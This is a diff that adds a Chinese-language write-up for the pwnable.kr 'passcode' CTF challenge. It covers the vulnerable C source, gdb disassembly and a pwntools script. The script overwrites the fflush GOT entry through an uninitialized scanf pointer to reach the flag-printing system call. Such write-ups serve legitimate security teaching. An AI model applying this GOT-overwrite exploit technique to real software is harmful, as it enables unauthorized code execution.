@@ -8072,4 +8072,255 @@ pwndbg> x/1s *0x6c2070  # 根据程序的注释查看flag的内容
 
 ------
 
-### 
+### passcode
+
+这是**Pwnable.kr**的第五个挑战`passcode`，来自**[Toddler's Bottle]**部分。
+
+```bash
+Mommy told me to make a passcode based login system.
+My initial C code was compiled without any error!
+Well, there was some compiler warning, but who cares about that?
+
+ssh passcode@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh passcode@pwnable.kr -p2222
+passcode@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Thu Jun  8 05:29:42 2023 from 5.29.16.52
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+passcode@pwnable:~$ ls -la
+total 44
+drwxr-x---   5 root passcode     4096 Jul  2  2022 .
+drwxr-xr-x 117 root root         4096 Nov 10  2022 ..
+d---------   2 root root         4096 Jun 26  2014 .bash_history
+-r--r-----   1 root passcode_pwn   48 Jun 26  2014 flag
+dr-xr-xr-x   2 root root         4096 Aug 20  2014 .irssi
+-rw-------   1 root root         1287 Jul  2  2022 .mysql_history
+-r-xr-sr-x   1 root passcode_pwn 7485 Jun 26  2014 passcode
+-rw-r--r--   1 root root          858 Jun 26  2014 passcode.c
+drwxr-xr-x   2 root root         4096 Oct 23  2016 .pwntools-cache
+-rw-------   1 root root          581 Jul  2  2022 .viminfo
+```
+
+我们可以看到三个文件`passcode`、`passcode.c`和`flag`，其中`passcode`是`ELF`二进制可执行文件，`passcode.c`是编译二进制文件的`C`代码，用户`passcode`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat passcode.c`来查看`passcode.c`的代码。
+
+```bash
+passcode@pwnable:~$ cat passcode.c
+#include <stdio.h>
+#include <stdlib.h>
+
+void login(){
+    int passcode1;
+    int passcode2;
+
+    printf("enter passcode1 : ");
+    scanf("%d", passcode1);
+    fflush(stdin);
+
+    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+    printf("enter passcode2 : ");
+    scanf("%d", passcode2);
+
+    printf("checking...\n");
+    if(passcode1==338150 && passcode2==13371337){
+            printf("Login OK!\n");
+            system("/bin/cat flag");
+    }
+    else{
+            printf("Login Failed!\n");
+            exit(0);
+    }
+}
+
+void welcome(){
+    char name[100];
+    printf("enter you name : ");
+    scanf("%100s", name);
+    printf("Welcome %s!\n", name);
+}
+
+int main(){
+    printf("Toddler's Secure Login System 1.0 beta.\n");
+
+    welcome();
+    login();
+
+    // something after login...
+    printf("Now I can safely trust you that you have credential :)\n");
+    return 0;
+}
+```
+
+首先来看`welcome()`函数，声明了一个大小为`100`的变量`name`，用来读取用户输入的姓名。接着来看`login()`函数，需要用户输入俩个密码，并根据硬编码值`338150`和`13371337`来进行核对，如果输入正确就能读取文件`flag`中的内容。这题不是白给吗？
+
+```bash
+passcode@pwnable:~$ ./passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : t0ur1st
+Welcome t0ur1st!
+enter passcode1 : 338150
+Segmentation fault (core dumped)
+```
+
+没那么简单~~就能找到聊得来的伴~~ ~ 为什么会遇到段错误？因为`scanf`语句写错啦，它并没有用`&`提供`passcode1`和`passcode2`的地址，而是直接传递值。重新回顾到`welcome()`函数，这才发现该函数中的`scanf`语句同样写错啦。怎样利用该语句的漏洞来获取`flag`呢？用`gdb`来进一步了解该程序。
+
+```bash
+passcode@pwnable:~$ gdb ./passcode
+(gdb) disass welcome
+Dump of assembler code for function welcome:
+   0x08048609 <+0>:     push   %ebp
+   0x0804860a <+1>:     mov    %esp,%ebp
+   0x0804860c <+3>:     sub    $0x88,%esp
+   0x08048612 <+9>:     mov    %gs:0x14,%eax
+   0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
+   0x0804861b <+18>:    xor    %eax,%eax
+   0x0804861d <+20>:    mov    $0x80487cb,%eax
+   0x08048622 <+25>:    mov    %eax,(%esp)
+   0x08048625 <+28>:    call   0x8048420 <printf@plt>
+   0x0804862a <+33>:    mov    $0x80487dd,%eax
+   0x0804862f <+38>:    lea    -0x70(%ebp),%edx   # 注意到edx(处理I/O的数据寄存器)的值移动到了$ebp-0x70
+   0x08048632 <+41>:    mov    %edx,0x4(%esp)
+   0x08048636 <+45>:    mov    %eax,(%esp)
+   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x0804863e <+53>:    mov    $0x80487e3,%eax
+   0x08048643 <+58>:    lea    -0x70(%ebp),%edx  # 注意到edx(处理I/O的数据寄存器)的值移动到了$ebp-0x70
+   0x08048646 <+61>:    mov    %edx,0x4(%esp)
+   0x0804864a <+65>:    mov    %eax,(%esp)
+   0x0804864d <+68>:    call   0x8048420 <printf@plt>
+   0x08048652 <+73>:    mov    -0xc(%ebp),%eax
+   0x08048655 <+76>:    xor    %gs:0x14,%eax
+   0x0804865c <+83>:    je     0x8048663 <welcome+90>
+   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
+   0x08048663 <+90>:    leave  
+   0x08048664 <+91>:    ret    
+End of assembler dump.
+(gdb) b *0x8048643
+Breakpoint 1 at 0x8048643
+(gdb) run
+Starting program: /home/passcode/passcode 
+Toddler's Secure Login System 1.0 beta.
+enter you name : t0ur1st
+
+Breakpoint 1, 0x08048643 in welcome ()
+(gdb) x/1s $ebp-0x70      # 果然这就是name
+0xffdc91c8:     "t0ur1st"
+```
+
+知道了`name`的起始地址后，继续来看`login()`函数。
+
+```assembly
+(gdb) disass login
+Dump of assembler code for function login:
+   0x08048564 <+0>:     push   %ebp
+   0x08048565 <+1>:     mov    %esp,%ebp
+   0x08048567 <+3>:     sub    $0x28,%esp
+   0x0804856a <+6>:     mov    $0x8048770,%eax
+   0x0804856f <+11>:    mov    %eax,(%esp)
+   0x08048572 <+14>:    call   0x8048420 <printf@plt>
+   0x08048577 <+19>:    mov    $0x8048783,%eax
+   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
+   0x0804857f <+27>:    mov    %edx,0x4(%esp)
+   0x08048583 <+31>:    mov    %eax,(%esp)
+   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x0804858b <+39>:    mov    0x804a02c,%eax
+   0x08048590 <+44>:    mov    %eax,(%esp)
+   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
+   0x08048598 <+52>:    mov    $0x8048786,%eax
+   0x0804859d <+57>:    mov    %eax,(%esp)
+   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
+   0x080485a5 <+65>:    mov    $0x8048783,%eax
+   0x080485aa <+70>:    mov    -0xc(%ebp),%edx
+   0x080485ad <+73>:    mov    %edx,0x4(%esp)
+   0x080485b1 <+77>:    mov    %eax,(%esp)
+   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x080485b9 <+85>:    movl   $0x8048799,(%esp)
+   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
+   0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp)
+   0x080485cc <+104>:   jne    0x80485f1 <login+141>
+---Type <return> to continue, or q <return> to quit---
+   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
+   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
+   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
+   0x080485de <+122>:   call   0x8048450 <puts@plt>
+   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
+   0x080485ea <+134>:   call   0x8048460 <system@plt>
+   0x080485ef <+139>:   leave  
+   0x080485f0 <+140>:   ret    
+   0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
+   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
+   0x080485fd <+153>:   movl   $0x0,(%esp)
+   0x08048604 <+160>:   call   0x8048480 <exit@plt>
+End of assembler dump.
+```
+
+注意到有几行汇编代码从处理输入输出的`$edx`数据寄存器中赋值到了内存中的`scanf`，这里的汇编指令用的是`mov`而非`lea`。
+
+```assembly
+0x0804857c <+24>:    mov    -0x10(%ebp),%edx
+...
+0x080485aa <+70>:    mov    -0xc(%ebp),%edx
+```
+
+此处的`$ebp-0x10`更可能存放`passcode1`的内容，`$ebp-0xc`更可能存放`passcode2`的内容。
+
+注意到输入完`passcode1`后执行了`fflush(stdin);`，反汇编`fflush`函数可以从`jmp *0x804a004`中得到它的起始地址`0x804a004`。
+
+```assembly
+(gdb) disass fflush
+Dump of assembler code for function fflush@plt:
+   0x08048430 <+0>:     jmp    *0x804a004
+   0x08048436 <+6>:     push   $0x8
+   0x0804843b <+11>:    jmp    0x8048410
+End of assembler dump.
+```
+
+因为编译器会（错误地）将`passcode1`的值解释为地址，所以我们想要覆盖`passcode1`的值，我们的输入将被写入该值作为地址。所以我们需要填充`padding`到达缓冲区的末尾，然后设置`fflush`的起始地址`0x804a004`来劫持程序去执行`system("/bin/cat flag");`。此外，调用`system("/bin/cat flag");`这条语句对应的地址应该是`   0x080485e3 <+127>:   movl   $0x80487af,(%esp)`而不是
+`0x080485ea <+134>:   call   0x8048460 <system@plt>`。
+
+编写`Python`代码进行求解，需要注意的是最后提交的`flag`应该是`Sorry mom.. I got confused about scanf usage :(`，而不是`Now I can safely trust you that you have credential :)`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+shell = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')
+io = shell.process('./passcode')
+io.recvuntil("enter you name : ")
+payload = b'a'*96 + p32(0x804a004)
+io.sendline(payload)
+io.recvuntil("enter passcode1 : ")
+io.sendline(b'134514147')  # str.encode(str(0x80485e3))
+flag = io.recv()
+log.success(flag)
+# Sorry mom.. I got confused about scanf usage :(
+# Now I can safely trust you that you have credential :)
+io.close()
+shell.close()
+```
+
+------
+
+
+
